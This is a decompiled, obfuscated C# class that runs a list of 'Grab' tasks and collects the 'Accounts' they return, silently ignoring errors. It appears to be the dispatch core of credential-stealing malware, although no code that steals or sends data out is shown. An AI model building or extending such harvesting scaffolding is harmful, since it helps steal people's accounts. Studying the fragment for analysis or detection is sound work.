using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace p3N5Y;

public class _0OgNv
{
	[CompilerGenerated]
	private List<MnVCfk> Tasks__BackingField;

	[CompilerGenerated]
	private List<ii68> Accounts__BackingField;

	public List<MnVCfk> r9TmUNSoOs
	{
		[CompilerGenerated]
		get
		{
			return Tasks__BackingField;
		}
		[CompilerGenerated]
		private set
		{
			Tasks__BackingField = value;
		}
	}

	public List<ii68> fkDY
	{
		[CompilerGenerated]
		get
		{
			return Accounts__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Accounts__BackingField = value;
		}
	}

	public _0OgNv()
	{
		r9TmUNSoOs = new List<MnVCfk>();
		fkDY = new List<ii68>();
	}

	public void mCT(MnVCfk cgJ)
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				r9TmUNSoOs.Add(cgJ);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
	}

	public void ym4hzCp3S6l()
	{
		int num = 0;
		List<MnVCfk>.Enumerator enumerator = default;
		do
		{
			if (num == 1)
			{
				enumerator = r9TmUNSoOs.GetEnumerator();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			while (enumerator.MoveNext())
			{
				MnVCfk current = enumerator.Current;
				try
				{
					fkDY.AddRange(current.Grab());
					GC.Collect();
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
		r9TmUNSoOs.Clear();
	}
}
